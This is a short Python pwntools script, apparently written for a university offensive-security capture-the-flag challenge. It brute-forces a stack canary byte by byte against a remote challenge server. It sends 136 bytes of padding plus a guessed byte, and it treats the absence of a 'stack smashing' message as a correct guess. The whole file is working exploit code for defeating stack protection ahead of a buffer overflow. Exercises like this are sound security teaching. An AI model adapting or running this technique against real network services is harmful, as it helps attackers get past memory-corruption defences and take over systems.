#!/usr/bin/env python
from pwn import *
import os,sys
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1340
canary_offset = 136
canary = ""
guess = 0x0
buf = ""
buf += "A" * canary_offset
buf += canary

while len(canary) < 8:
    while guess != 0xff:
        try:
            context.log_level = 'debug'
            conn = remote(host,port)
            conn.recvuntil(': ')
            conn.send('jc9093\n')
            conn.recvuntil('name?')
            conn.sendline(str(canary_offset))
            conn.recvuntil('data')
            conn.sendline(buf + chr(guess))
            response = conn.recv(1024)
            print response
            # if we don't get an exception, we guessed the correct byte
            if "smashing" not in response:
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                buf += chr(guess)
                guess = 0x0
                break

            else:
                # guessed the wrong byte
                guess += 1
                conn.close()
        except EOFError,e:
            # guessed the wrong byte
            guess += 1
print "Canary:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
print "Hexdump:", hexdump(canary)
    
